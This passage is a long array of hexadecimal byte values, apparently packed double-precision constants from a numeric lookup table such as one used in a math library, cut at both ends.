0x42, 0x1a, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x39, 0x28, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x2a, 0x36, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x13, 0x44, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8f, 0x20, 0xb2, 0x22, 0xbc, 0xa, 0xb2, 0x3d, 0xd4, 0xd, 0x2e, 0x33, 0x69, 0xf, 0xb1, 0x3d, 0x57, 0xd2, 0x7e, 0xe8, 0xd, 0x95, 0xce, 0x3d, 0x69, 0x6d, 0x62, 0x3b, 0x44, 0xf3, 0xd3, 0x3d, 0x57, 0x3e, 0x36, 0xa5, 0xea, 0x5a, 0xf4, 0x3d, 0xb, 0xbf, 0xe1, 0x3c, 0x68, 0x43, 0xc4, 0x3d, 0x11, 0xa5, 0xc6, 0x60, 0xcd, 0x89, 0xf9, 0x3d, 0x9f, 0x2e, 0x1f, 0x20, 0x6f, 0x62, 0xfd, 0x3d, 0xcd, 0xbd, 0xda, 0xb8, 0x8b, 0x4f, 0xe9, 0x3d, 0x15, 0x30, 0x42, 0xef, 0xd8, 0x88, 0x0, 0x3e, 0xad, 0x79, 0x2b, 0xa6, 0x13, 0x4, 0x8, 0x3e, 0xc4, 0xd3, 0xee, 0xc0, 0x17, 0x97, 0x5, 0x3e, 0x2, 0x49, 0xd4, 0xad, 0x77, 0x4a, 0xad, 0x3d, 0xe, 0x30, 0x37, 0xf0, 0x3f, 0x76, 0xe, 0x3e, 0xc3, 0xf6, 0x6, 0x47, 0xd7, 0x62, 0xe1, 0x3d, 0x14, 0xbc, 0x4d, 0x1f, 0xcc, 0x1, 0x6, 0x3e, 0xbf, 0xe5, 0xf6, 0x51, 0xe0, 0xf3, 0xea, 0x3d, 0xeb, 0xf3, 0x1a, 0x1e, 0xb, 0x7a, 0x9, 0x3e, 0xc7, 0x2, 0xc0, 0x70, 0x89, 0xa3, 0xc0, 0x3d, 0x51, 0xc7, 0x57, 0x0, 0x0, 0x2e, 0x10, 0x3e, 0xe, 0x6e, 0xcd, 0xee, 0x0, 0x5b, 0x15, 0x3e, 0xaf, 0xb5, 0x3, 0x70, 0x29, 0x86, 0xdf, 0x3d, 0x6d, 0xa3, 0x36, 0xb3, 0xb9, 0x57, 0x10, 0x3e, 0x4f, 0xea, 0x6, 0x4a, 0xc8, 0x4b, 0x13, 0x3e, 0xad, 0xbc, 0xa1, 0x9e, 0xda, 0x43, 0x16, 0x3e, 0x2a, 0xea, 0xf7, 0xb4, 0xa7, 0x66, 0x1d, 0x3e, 0xef, 0xfc, 0xf7, 0x38, 0xe0, 0xb2, 0xf6, 0x3d, 0x88, 0xf0, 0x70, 0xc6, 0x54, 0xe9, 0xf3, 0x3d, 0xb3, 0xca, 0x3a, 0x9, 0x9, 0x72, 0x4, 0x3e, 0xa7, 0x5d, 0x27, 0xe7, 0x8f, 0x70, 0x1d, 0x3e, 0xe7, 0xb9, 0x71, 0x77, 0x9e, 0xdf, 0x1f, 0x3e, 0x60, 0x6, 0xa, 0xa7, 0xbf, 0x27, 0x8, 0x3e, 0x14, 0xbc, 0x4d, 0x1f, 0xcc, 0x1, 0x16, 0x3e, 0x5b, 0x5e, 0x6a, 0x10, 0xf6, 0x37, 0x6, 0x3e, 0x4b, 0x62, 0x7c, 0xf1, 0x13, 0x6a, 0x12, 0x3e, 0x3a, 0x62, 0x80, 0xce, 0xb2, 0x3e, 0x9, 0x3e, 0xde, 0x94, 0x15, 0xe9, 0xd1, 0x30, 0x14, 0x3e, 0x31, 0xa0, 0x8f, 0x10, 0x10, 0x6b, 0x1d, 0x3e, 0x41, 0xf2, 0xba, 0xb, 0x9c, 0x87, 0x16, 0x3e, 0x2b, 0xbc, 0xa6, 0x5e, 0x1, 0x8, 0xff, 0x3d, 0x6c, 0x67, 0xc6, 0xcd, 0x3d, 0xb6, 0x29, 0x3e, 0x2c, 0xab, 0xc4, 0xbc, 0x2c, 0x2, 0x2b, 0x3e, 0x44, 0x65, 0xdd, 0x7d, 0xd0, 0x17, 0xf9, 0x3d, 0x9e, 0x37, 0x3, 0x57, 0x60, 0x40, 0x15, 0x3e, 0x60, 0x1b, 0x7a, 0x94, 0x8b, 0xd1, 0xc, 0x3e, 0x7e, 0xa9, 0x7c, 0x27, 0x65, 0xad, 0x17, 0x3e, 0xa9, 0x5f, 0x9f, 0xc5, 0x4d, 0x88, 0x11, 0x3e, 0x82, 0xd0, 0x6, 0x60, 0xc4, 0x11, 0x17, 0x3e, 0xf8, 0x8, 0x31, 0x3c, 0x2e, 0x9, 0x2f, 0x3e, 0x3a, 0xe1, 0x2b, 0xe3, 0xc5, 0x14, 0x17, 0x3e, 0x9a, 0x4f, 0x73, 0xfd, 0xa7, 0xbb, 0x26, 0x3e, 0x83, 0x84, 0xe0, 0xb5, 0x8f, 0xf4, 0xfd, 0x3d, 0x95, 0xb, 0x4d, 0xc7, 0x9b, 0x2f, 0x23, 0x3e, 0x13, 0xc, 0x79, 0x48, 0xe8, 0x73, 0xf9, 0x3d, 0x6e, 0x58, 0xc6, 0x8, 0xbc, 0xcc, 0x1e, 0x3e, 0x98, 0x4a, 0x52, 0xf9, 0xe9, 0x15, 0x21, 0x3e, 0xb8, 0x31, 0x31, 0x59, 0x40, 0x17, 0x2f, 0x3e, 0x35, 0x38, 0x64, 0x25, 0x8b, 0xcf, 0x1b, 0x3e, 0x80, 0xed, 0x8b, 0x1d, 0xa8, 0x5f, 0x1f, 0x3e, 0xe4, 0xd9, 0x29, 0xf9, 0x4d, 0x4a, 0x24, 0x3e, 0x94, 0xc, 0x22, 0xd8, 0x20, 0x98, 0x12, 0x3e, 0x9, 0xe3, 0x4, 0x93, 0x48, 0xb, 0x2a, 0x3e, 0xfe, 0x65, 0xa6, 0xab, 0x56, 0x4d, 0x1f, 0x3e, 0x63, 0x51, 0x36, 0x19, 0x90, 0xc, 0x21, 0x3e, 0x36, 0x27, 0x59, 0xfe, 0x78, 0xf, 0xf8, 0x3d, 0xca, 0x1c, 0xc8, 0x25, 0x88, 0x52, 0x10, 0x3e, 0x6a, 0x74, 0x6d, 0x7d, 0x53, 0x95, 0xe0, 0x3d, 0x60, 0x6, 0xa, 0xa7, 0xbf, 0x27, 0x18, 0x3e, 0x3c, 0x93, 0x45, 0xec, 0xa8, 0xb0, 0x6, 0x3e, 0xa9, 0xdb, 0xf5, 0x1b, 0xf8, 0x5a, 0x10, 0x3e, 0x15, 0xd5, 0x55, 0x26, 0xfa, 0xe2, 0x17, 0x3e, 0xbf, 0xe4, 0xae, 0xbf, 0xec, 0x59, 0xd, 0x3e, 0xa3, 0x3f, 0x68, 0xda, 0x2f, 0x8b, 0x1d, 0x3e, 0x37, 0x37, 0x3a, 0xfd, 0xdd, 0xb8, 0x24, 0x3e, 0x4, 0x12, 0xae, 0x61, 0x7e, 0x82, 0x13, 0x3e, 0x9f, 0xf, 0xe9, 0x49, 0x7b, 0x8c, 0x2c, 0x3e, 0x1d, 0x59, 0x97, 0x15, 0xf0, 0xea, 0x29, 0x3e, 0x36, 0x7b, 0x31, 0x6e, 0xa6, 0xaa, 0x19, 0x3e, 0x55, 0x6, 0x72, 0x9, 0x56, 0x72, 0x2e, 0x3e, 0x54, 0xac, 0x7a, 0xfc, 0x33, 0x1c, 0x26, 0x3e, 0x52, 0xa2, 0x61, 0xcf, 0x2b, 0x66, 0x29, 0x3e, 0x30, 0x27, 0xc4, 0x11, 0xc8, 0x43, 0x18, 0x3e, 0x36, 0xcb, 0x5a, 0xb, 0xbb, 0x64, 0x20, 0x3e, 0xa4, 0x1, 0x27, 0x84, 0xc, 0x34, 0xa, 0x3e, 0xd6, 0x79, 0x8f, 0xb5, 0x55, 0x8e, 0x1a, 0x3e, 0x9a, 0x9d, 0x5e, 0x9c, 0x21, 0x2d, 0xe9, 0x3d, 0x6a, 0xfd, 0x7f, 0xd, 0xe6, 0x63, 0x3f, 0x3e, 0x14, 0x63, 0x51, 0xd9, 0xe, 0x9b, 0x2e, 0x3e, 0xc, 0x35, 0x62, 0x19, 0x90, 0x23, 0x29, 0x3e, 0x81, 0x5e, 0x78, 0x38, 0x88, 0x6f, 0x32, 0x3e, 0xaf, 0xa6, 0xab, 0x4c, 0x6a, 0x5b, 0x3b, 0x3e, 0x1c, 0x76, 0x8e, 0xdc, 0x6a, 0x22, 0xf0, 0x3d, 0xed, 0x1a, 0x3a, 0x31, 0xd7, 0x4a, 0x3c, 0x3e, 0x17, 0x8d, 0x73, 0x7c, 0xe8, 0x64, 0x15, 0x3e, 0x18, 0x66, 0x8a, 0xf1, 0xec, 0x8f, 0x33, 0x3e, 0x66, 0x76, 0x77, 0xf5, 0x9e, 0x92, 0x3d, 0x3e, 0xb8, 0xa0, 0x8d, 0xf0, 0x3b, 0x48, 0x39, 0x3e, 0x26, 0x58, 0xaa, 0xee, 0xe, 0xdd, 0x3b, 0x3e, 0xba, 0x37, 0x2, 0x59, 0xdd, 0xc4, 0x39, 0x3e, 0xc7, 0xca, 0xeb, 0xe0, 0xe9, 0xf3, 0x1a, 0x3e, 0xac, 0xd, 0x27, 0x82, 0x53, 0xce, 0x35, 0x3e, 0xba, 0xb9, 0x2a, 0x53, 0x74, 0x4f, 0x39, 0x3e, 0x54, 0x86, 0x88, 0x95, 0x27, 0x34, 0x7, 0x3e, 0xf0, 0x4b, 0xe3, 0xb, 0x0, 0x5a, 0xc, 0x3e, 0x82, 0xd0, 0x6, 0x60, 0xc4, 0x11, 0x27, 0x3e, 0xf8, 0x8c, 0xed, 0xb4, 0x25, 0x0, 0x25, 0x3e, 0xa0, 0xd2, 0xf2, 0xce, 0x8b, 0xd1, 0x2e, 0x3e, 0x54, 0x75, 0xa, 0xc, 0x2e, 0x28, 0x21, 0x3e, 0xca, 0xa7, 0x59, 0x33, 0xf3, 0x70, 0xd, 0x3e, 0x25, 0x40, 0xa8, 0x13, 0x7e, 0x7f, 0x2b, 0x3e, 0x1e, 0x89, 0x21, 0xc3, 0x6e, 0x30, 0x33, 0x3e, 0x50, 0x75, 0x8b, 0x3, 0xf8, 0xc7, 0x3f, 0x3e, 0x64, 0x1d, 0xd7, 0x8c, 0x35, 0xb0, 0x3e, 0x3e, 0x74, 0x94, 0x85, 0x22, 0xc8, 0x76, 0x3a, 0x3e, 0xe3, 0x86, 0xde, 0x52, 0xc6, 0xe, 0x3d, 0x3e, 0xaf, 0x58, 0x86, 0xe0, 0xcc, 0xa4, 0x2f, 0x3e, 0x9e, 0xa, 0xc0, 0xd2, 0xa2, 0x84, 0x3b, 0x3e, 0xd1, 0x5b, 0xc2, 0xf2, 0xb0, 0xa5, 0x20, 0x3e, 0x99, 0xf6, 0x5b, 0x22, 0x60, 0xd6, 0x3d, 0x3e, 0x37, 0xf0, 0x9b, 0x85, 0xf, 0xb1, 0x8, 0x3e, 0xe1, 0xcb, 0x90, 0xb5, 0x23, 0x88, 0x3e, 0x3e, 0xf6, 0x96, 0x1e, 0xf3, 0x11, 0x13, 0x36, 0x3e, 0x9a, 0xf, 0xa2, 0x5c, 0x87, 0x1f, 0x2e, 0x3e, 0xa5, 0xb9, 0x39, 0x49, 0x72, 0x95, 0x2c, 0x3e, 0xe2, 0x58, 0x3e, 0x7a, 0x95, 0x5, 0x38, 0x3e, 0x34, 0x3, 0x9f, 0xea, 0x26, 0xf1, 0x2f, 0x3e, 0x9, 0x56, 0x8e, 0x59, 0xf5, 0x53, 0x39, 0x3e, 0x48, 0xc4, 0x56, 0xf8, 0x6f, 0xc1, 0x36, 0x3e, 0xf4, 0x61, 0xf2, 0xf, 0x22, 0xcb, 0x24, 0x3e, 0xa2, 0x53, 0x3d, 0xd5, 0x20, 0xe1, 0x35, 0x3e, 0x56, 0xf2, 0x89, 0x61, 0x7f, 0x52, 0x3a, 0x3e, 0xf, 0x9c, 0xd4, 0xff, 0xfc, 0x56, 0x38, 0x3e, 0xda, 0xd7, 0x28, 0x82, 0x2e, 0xc, 0x30, 0x3e, 0xe0, 0xdf, 0x44, 0x94, 0xd0, 0x13, 0xf1, 0x3d, 0xa6, 0x59, 0xea, 0xe, 0x63, 0x10, 0x25, 0x3e, 0x11, 0xd7, 0x32, 0xf, 0x78, 0x2e, 0x26, 0x3e, 0xcf, 0xf8, 0x10, 0x1a, 0xd9, 0x3e, 0xed, 0x3d, 0x85, 0xcd, 0x4b, 0x7e, 0x4a, 0x65, 0x23, 0x3e, 0x21, 0xad, 0x80, 0x49, 0x78, 0x5b, 0x5, 0x3e, 0x64, 0x6e, 0xb1, 0xd4, 0x2d, 0x2f, 0x21, 0x3e, 0xc, 0xf5, 0x39, 0xd9, 0xad, 0xc4, 0x37, 0x3e, 0xfc, 0x80, 0x71, 0x62, 0x84, 0x17, 0x28, 0x3e, 0x61, 0x49, 0xe1, 0xc7, 0x62, 0x51, 0xea, 0x3d, 0x63, 0x51, 0x36, 0x19, 0x90, 0xc, 0x31, 0x3e, 0x88, 0x76, 0xa1, 0x2b, 0x4d, 0x3c, 0x37, 0x3e, 0x81, 0x3d, 0xe9, 0xe0, 0xa5, 0xe8, 0x2a, 0x3e, 0xaf, 0x21, 0x16, 0xf0, 0xc6, 0xb0, 0x2a, 0x3e, 0x66, 0x5b, 0xdd, 0x74, 0x8b, 0x1e, 0x30, 0x3e, 0x94, 0x54, 0xbb, 0xec, 0x6f, 0x20, 0x2d, 0x3e, 0x0, 0xcc, 0x4f, 0x72, 0x8b, 0xb4, 0xf0, 0x3d, 0x29, 0xe2, 0x61, 0xb, 0x1f, 0x83, 0x3f, 0x3e, 0xaf, 0xbc, 0x7, 0xc4, 0x97, 0x1a, 0xf8, 0x3d, 0xaa, 0xb7, 0xcb, 0x1c, 0x6c, 0x28, 0x3e, 0x3e, 0x93, 0xa, 0x22, 0x49, 0xb, 0x63, 0x28, 0x3e, 0x5c, 0x2c, 0xa2, 0xc1, 0x15, 0xb, 0xff, 0x3d, 0x46, 0x9, 0x1c, 0xe7, 0x45, 0x54, 0x35, 0x3e, 0x85, 0x6d, 0x6, 0xf8, 0x30, 0xe6, 0x3b, 0x3e, 0x39, 0x6c, 0xd9, 0xf0, 0xdf, 0x99, 0x25, 0x3e, 0x81, 0xb0, 0x8f, 0xb1, 0x85, 0xcc, 0x36, 0x3e, 0xc8, 0xa8, 0x1e, 0x0, 0x6d, 0x47, 0x34, 0x3e, 0x1f, 0xd3, 0x16, 0x9e, 0x88, 0x3f, 0x37, 0x3e, 0x87, 0x2a, 0x79, 0xd, 0x10, 0x57, 0x33, 0x3e, 0xf6, 0x1, 0x61, 0xae, 0x79, 0xd1, 0x3b, 0x3e, 0xe2, 0xf6, 0xc3, 0x56, 0x10, 0xa3, 0xc, 0x3e, 0xfb, 0x8, 0x9c, 0x62, 0x70, 0x28, 0x3d, 0x3e, 0x3f, 0x67, 0xd2, 0x80, 0x38, 0xba, 0x3a, 0x3e, 0xa6, 0x7d, 0x29, 0xcb, 0x33, 0x36, 0x2c, 0x3e, 0x2, 0xea, 0xef, 0x99, 0x38, 0x84, 0x21, 0x3e, 0xe6, 0x8, 0x20, 0x9d, 0xc9, 0xcc, 0x3b, 0x3e, 0x50, 0xd3, 0xbd, 0x44, 0x5, 0x0, 0x38, 0x3e, 0xe1, 0x6a, 0x60, 0x26, 0xc2, 0x91, 0x2b, 0x3e, 0xdf, 0x2b, 0xb6, 0x26, 0xdf, 0x7a, 0x2a, 0x3e, 0xc9, 0x6e, 0x82, 0xc8, 0x4f, 0x76, 0x18, 0x3e, 0xf0, 0x68, 0xf, 0xe5, 0x3d, 0x4f, 0x1f, 0x3e, 0xe3, 0x95, 0x79, 0x75, 0xca, 0x60, 0xf7, 0x3d, 0x47, 0x51, 0x80, 0xd3, 0x7e, 0x66, 0xfc, 0x3d, 0x6f, 0xdf, 0x6a, 0x19, 0xf6, 0x33, 0x37, 0x3e, 0x6b, 0x83, 0x3e, 0xf3, 0x10, 0xb7, 0x2f, 0x3e, 0x13, 0x10, 0x64, 0xba, 0x6e, 0x88, 0x39, 0x3e, 0x1a, 0x8c, 0xaf, 0xd0, 0x68, 0x53, 0xfb, 0x3d, 0x71, 0x29, 0x8d, 0x1b, 0x69, 0x8c, 0x35, 0x3e, 0xfb, 0x8, 0x6d, 0x22, 0x65, 0x94, 0xfe, 0x3d, 0x97, 0x0, 0x3f, 0x6, 0x7e, 0x58, 0x33, 0x3e, 0x18, 0x9f, 0x12, 0x2, 0xe7, 0x18, 0x36, 0x3e, 0x54, 0xac, 0x7a, 0xfc, 0x33, 0x1c, 0x36, 0x3e, 0x4a, 0x60, 0x8, 0x84, 0xa6, 0x7, 0x3f, 0x3e, 0x21, 0x54, 0x94, 0xe4, 0xbf, 0x34, 0x3c, 0x3e, 0xb, 0x30, 0x41, 0xe, 0xf0, 0xb1, 0x38, 0x3e, 0x63, 0x1b, 0xd6, 0x84, 0x42, 0x43, 0x3f, 0x3e, 0x36, 0x74, 0x39, 0x5e, 0x9, 0x63, 0x3a, 0x3e, 0xde, 0x19, 0xb9, 0x56, 0x86, 0x42, 0x34, 0x3e, 0xa6, 0xd9, 0xb2, 0x1, 0x92, 0xca, 0x36, 0x3e, 0x1c, 0x93, 0x2a, 0x3a, 0x82, 0x38, 0x27, 0x3e, 0x30, 0x92, 0x17, 0xe, 0x88, 0x11, 0x3c, 0x3e, 0xfe, 0x52, 0x6d, 0x8d, 0xdc, 0x3d, 0x31, 0x3e, 0x17, 0xe9, 0x22, 0x89, 0xd5, 0xee, 0x33, 0x3e, 0x50, 0xdd, 0x6b, 0x84, 0x92, 0x59, 0x29, 0x3e, 0x8b, 0x27, 0x2e, 0x5f, 0x4d, 0xdb, 0xd, 0x3e, 0xc4, 0x35, 0x6, 0x2a, 0xf1, 0xa5, 0xf1, 0x3d, 0x34, 0x3c, 0x2c, 0x88, 0xf0, 0x42, 0x46, 0x3e, 0x5e, 0x47, 0xf6, 0xa7, 0x9b, 0xee, 0x2a, 0x3e, 0xe4, 0x60, 0x4a, 0x83, 0x7f, 0x4b, 0x26, 0x3e, 0x2e, 0x79, 0x43, 0xe2, 0x42, 0xd, 0x29, 0x3e, 0x1, 0x4f, 0x13, 0x8, 0x20, 0x27, 0x4c, 0x3e, 0x5b, 0xcf, 0xd6, 0x16, 0x2e, 0x78, 0x4a, 0x3e, 0x48, 0x66, 0xda, 0x79, 0x5c, 0x50, 0x44, 0x3e, 0x21, 0xcd, 0x4d, 0xea, 0xd4, 0xa9, 0x4c, 0x3e, 0xbc, 0xd5, 0x7c, 0x62, 0x3d, 0x7d, 0x29, 0x3e, 0x13, 0xaa, 0xbc, 0xf9, 0x5c, 0xb1, 0x20, 0x3e, 0xdd, 0x76, 0xcf, 0x63, 0x20, 0x5b, 0x31, 0x3e, 0x48, 0x27, 0xaa, 0xf3, 0xe6, 0x83, 0x29, 0x3e, 0x94, 0xe9, 0xff, 0xf4, 0x64, 0x4c, 0x3f, 0x3e, 0xf, 0x5a, 0xe8, 0x7c, 0xba, 0xbe, 0x46, 0x3e, 0xb8, 0xa6, 0x4e, 0xfd, 0x69, 0x9c, 0x3b, 0x3e, 0xab, 0xa4, 0x5f, 0x83, 0xa5, 0x6a, 0x2b, 0x3e, 0xd1, 0xed, 0xf, 0x79, 0xc3, 0xcc, 0x43, 0x3e, 0xe0, 0x4f, 0x40, 0xc4, 0x4c, 0xc0, 0x29, 0x3e, 0x9d, 0xd8, 0x75, 0x7a, 0x4b, 0x73, 0x40, 0x3e, 0x12, 0x16, 0xe0, 0xc4, 0x4, 0x44, 0x1b, 0x3e, 0x94, 0x48, 0xce, 0xc2, 0x65, 0xc5, 0x40, 0x3e, 0xcd, 0x35, 0xd9, 0x41, 0x14, 0xc7, 0x33, 0x3e, 0x4e, 0x3b, 0x6b, 0x55, 0x92, 0xa4, 0x72, 0x3d, 0x43, 0xdc, 0x41, 0x3, 0x9, 0xfa, 0x20, 0x3e, 0xf4, 0xd9, 0xe3, 0x9, 0x70, 0x8f, 0x2e, 0x3e, 0x45, 0x8a, 0x4, 0x8b, 0xf6, 0x1b, 0x4b, 0x3e, 0x56, 0xa9, 0xfa, 0xdf, 0x52, 0xee, 0x3e, 0x3e, 0xbd, 0x65, 0xe4, 0x0, 0x9, 0x6b, 0x45, 0x3e, 0x66, 0x76, 0x77, 0xf5, 0x9e, 0x92, 0x4d, 0x3e, 0x60, 0xe2, 0x37, 0x86, 0xa2, 0x6e, 0x48, 0x3e, 0xf0, 0xa2, 0xc, 0xf1, 0xaf, 0x65, 0x46, 0x3e, 0x74, 0xec, 0x48, 0xaf, 0xfd, 0x11, 0x2f, 0x3e, 0xc7, 0xd1, 0xa4, 0x86, 0x1b, 0xbe, 0x4c, 0x3e, 0x65, 0x76, 0xa8, 0xfe, 0x5b, 0xb0, 0x25, 0x3e, 0x1d, 0x4a, 0x1a, 0xa, 0xc2, 0xce, 0x41, 0x3e, 0x9f, 0x9b, 0x40, 0xa, 0x5f, 0xcd, 0x41, 0x3e, 0x70, 0x50, 0x26, 0xc8, 0x56, 0x36, 0x45, 0x3e, 0x60, 0x22, 0x28, 0x35, 0xd8, 0x7e, 0x37, 0x3e, 0xd2, 0xb9, 0x40, 0x30, 0xbc, 0x17, 0x24, 0x3e, 0xf2, 0xef, 0x79, 0x7b, 0xef, 0x8e, 0x40, 0x3e, 0xe9, 0x57, 0xdc, 0x39, 0x6f, 0xc7, 0x4d, 0x3e, 0x57, 0xf4, 0xc, 0xa7, 0x93, 0x4, 0x4c, 0x3e, 0xc, 0xa6, 0xa5, 0xce, 0xd6, 0x83, 0x4a, 0x3e, 0xba, 0x57, 0xc5, 0xd, 0x70, 0xd6, 0x30, 0x3e, 0xa, 0xbd, 0xe8, 0x12, 0x6c, 0xc9, 0x44, 0x3e, 0x15, 0x23, 0xe3, 0x93, 0x19, 0x2c, 0x3d, 0x3e, 0x42, 0x82, 0x5f, 0x13, 0x21, 0xc7, 0x22, 0x3e, 0x7d, 0x74, 0xda, 0x4d, 0x3e, 0x9a, 0x27, 0x3e, 0x2b, 0xa7, 0x41, 0x69, 0x9f, 0xf8, 0xfc, 0x3d, 0x31, 0x8, 0xf1, 0x2, 0xa7, 0x49, 0x21, 0x3e, 0xdb, 0x75, 0x81, 0x7c, 0x4b, 0xad, 0x4e, 0x3e, 0xa, 0xe7, 0x63, 0xfe, 0x30, 0x69, 0x4e, 0x3e, 0x2f, 0xee, 0xd9, 0xbe, 0x6, 0xe1, 0x41, 0x3e, 0x92, 0x1c, 0xf1, 0x82, 0x2b, 0x68, 0x2d, 0x3e, 0x7c, 0xa4, 0xdb, 0x88, 0xf1, 0x7, 0x3a, 0x3e, 0xf6, 0x72, 0xc1, 0x2d, 0x34, 0xf9, 0x40, 0x3e, 0x25, 0x3e, 0x62, 0xde, 0x3f, 0xef, 0x3, 0x3e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x20, 0xe0, 0x1f, 0xe0, 0x1f, 0xe0, 0xff, 0x3f, 0xf0, 0x7, 0xfc, 0x1, 0x7f, 0xc0, 0xff, 0x3f, 0x12, 0xfa, 0x1, 0xaa, 0x1c, 0xa1, 0xff, 0x3f, 0x20, 0xf8, 0x81, 0x1f, 0xf8, 0x81, 0xff, 0x3f, 0xb5, 0xdb, 0xa0, 0xac, 0x10, 0x63, 0xff, 0x3f, 0x71, 0x42, 0x4a, 0x9e, 0x65, 0x44, 0xff, 0x3f, 0xb5, 0xa, 0x23, 0x44, 0xf6, 0x25, 0xff, 0x3f, 0x8, 0x1f, 0x7c, 0xf0, 0xc1, 0x7, 0xff, 0x3f, 0x2, 0x8e, 0x45, 0xf8, 0xc7, 0xe9, 0xfe, 0x3f, 0xc0, 0xec, 0x1, 0xb3, 0x7, 0xcc, 0xfe, 0x3f, 0xeb, 0x1, 0xba, 0x7a, 0x80, 0xae, 0xfe, 0x3f, 0x67, 0xb7, 0xf0, 0xab, 0x31, 0x91, 0xfe, 0x3f, 0xe4, 0x50, 0x97, 0xa5, 0x1a, 0x74, 0xfe, 0x3f, 0x74, 0xe5, 0x1, 0xc9, 0x3a, 0x57, 0xfe, 0x3f, 0x73, 0x1a, 0xdc, 0x79, 0x91, 0x3a, 0xfe, 0x3f, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0x1e, 0xfe, 0x3f, 0x1e, 0xe0, 0x1, 0x1e, 0xe0, 0x1, 0xfe, 0x3f, 0x8a, 0x86, 0xf8, 0xe3, 0xd6, 0xe5, 0xfd, 0x3f, 0xca, 0x1d, 0xa0, 0xdc, 0x1, 0xca, 0xfd, 0x3f, 0xdb, 0x81, 0xb9, 0x76, 0x60, 0xae, 0xfd, 0x3f, 0x8a, 0x7f, 0x1e, 0x23, 0xf2, 0x92, 0xfd, 0x3f, 0x34, 0x2c, 0xb8, 0x54, 0xb6, 0x77, 0xfd, 0x3f, 0xb2, 0x72, 0x75, 0x80, 0xac, 0x5c, 0xfd, 0x3f, 0x1d, 0xd4, 0x41, 0x1d, 0xd4, 0x41, 0xfd, 0x3f, 0x1a, 0x5b, 0xfc, 0xa3, 0x2c, 0x27, 0xfd, 0x3f, 0x74, 0xc0, 0x6e, 0x8f, 0xb5, 0xc, 0xfd, 0x3f, 0xc6, 0xbf, 0x44, 0x5c, 0x6e, 0xf2, 0xfc, 0x3f, 0xb, 0x9b, 0x3, 0x89, 0x56, 0xd8, 0xfc, 0x3f, 0xe7, 0xcb, 0x1, 0x96, 0x6d, 0xbe, 0xfc, 0x3f, 0x91, 0xe1, 0x5e, 0x5, 0xb3, 0xa4, 0xfc, 0x3f, 0x42, 0x8a, 0xfb, 0x5a, 0x26, 0x8b, 0xfc, 0x3f, 0x1c, 0xc7, 0x71, 0x1c, 0xc7, 0x71, 0xfc, 0x3f, 0x86, 0x49, 0xd, 0xd1, 0x94, 0x58, 0xfc, 0x3f, 0xf0, 0xf8, 0xc3, 0x1, 0x8f, 0x3f, 0xfc, 0x3f, 0x1c, 0xa0, 0x2e, 0x39, 0xb5, 0x26, 0xfc, 0x3f, 0xe0, 0xc0, 0x81, 0x3, 0x7, 0xe, 0xfc, 0x3f, 0x8b, 0x8d, 0x86, 0xee, 0x83, 0xf5, 0xfb, 0x3f, 0xf7, 0x6, 0x94, 0x89, 0x2b, 0xdd, 0xfb, 0x3f, 0x7b, 0x3e, 0x88, 0x65, 0xfd, 0xc4, 0xfb, 0x3f, 0xd0, 0xba, 0xc1, 0x14, 0xf9, 0xac, 0xfb, 0x3f, 0x23, 0xff, 0x18, 0x2b, 0x1e, 0x95, 0xfb, 0x3f, 0x8b, 0x33, 0xda, 0x3d, 0x6c, 0x7d, 0xfb, 0x3f, 0x5, 0xee, 0xbe, 0xe3, 0xe2, 0x65, 0xfb, 0x3f, 0x4f, 0x1b, 0xe8, 0xb4, 0x81, 0x4e, 0xfb, 0x3f, 0xce, 0x6, 0xd8, 0x4a, 0x48, 0x37, 0xfb, 0x3f, 0xd9, 0x80, 0x6c, 0x40, 0x36, 0x20, 0xfb, 0x3f, 0xa4, 0x22, 0xd9, 0x31, 0x4b, 0x9, 0xfb, 0x3f, 0x28, 0xaf, 0xa1, 0xbc, 0x86, 0xf2, 0xfa, 0x3f, 0x5e, 0x90, 0x94, 0x7f, 0xe8, 0xdb, 0xfa, 0x3f, 0x1b, 0x70, 0xc5, 0x1a, 0x70, 0xc5, 0xfa, 0x3f, 0xfd, 0xeb, 0x87, 0x2f, 0x1d, 0xaf, 0xfa, 0x3f, 0xbe, 0x63, 0x6a, 0x60, 0xef, 0x98, 0xfa, 0x3f, 0x59, 0xe1, 0x30, 0x51, 0xe6, 0x82, 0xfa, 0x3f, 0x6d, 0x1a, 0xd0, 0xa6, 0x1, 0x6d, 0xfa, 0x3f, 0x4a, 0x8a, 0x68, 0x7, 0x41, 0x57, 0xfa, 0x3f, 0x1a, 0xa4, 0x41, 0x1a, 0xa4, 0x41, 0xfa, 0x3f, 0xa0, 0x1c, 0xc5, 0x87, 0x2a, 0x2c, 0xfa, 0x3f, 0x2, 0x4b, 0x7a, 0xf9, 0xd3, 0x16, 0xfa, 0x3f, 0x1a, 0xa0, 0x1, 0x1a, 0xa0, 0x1, 0xfa, 0x3f, 0xd9, 0x33, 0x10, 0x95, 0x8e, 0xec, 0xf9, 0x3f, 0x2d, 0x68, 0x6b, 0x17, 0x9f, 0xd7, 0xf9, 0x3f, 0x2, 0xa1, 0xe4, 0x4e, 0xd1, 0xc2, 0xf9, 0x3f, 0xda, 0x10, 0x55, 0xea, 0x24, 0xae, 0xf9, 0x3f, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0xf9, 0x3f, 0xff, 0xc0, 0x8e, 0xd, 0x2f, 0x85, 0xf9, 0x3f, 0x72, 0xb8, 0xc, 0xf8, 0xe4, 0x70, 0xf9, 0x3f, 0xae, 0x77, 0xe3, 0xb, 0xbb, 0x5c, 0xf9, 0x3f, 0xe0, 0xe9, 0xd6, 0xfc, 0xb0, 0x48, 0xf9, 0x3f, 0xe6, 0x2c, 0x9b, 0x7f, 0xc6, 0x34, 0xf9, 0x3f, 0x29, 0xe2, 0xd0, 0x49, 0xfb, 0x20, 0xf9, 0x3f, 0xd5, 0x90, 0x1, 0x12, 0x4f, 0xd, 0xf9, 0x3f, 0xfa, 0x18, 0x9c, 0x8f, 0xc1, 0xf9, 0xf8, 0x3f, 0x3f, 0x37, 0xf1, 0x7a, 0x52, 0xe6, 0xf8, 0x3f, 0xd3, 0x18, 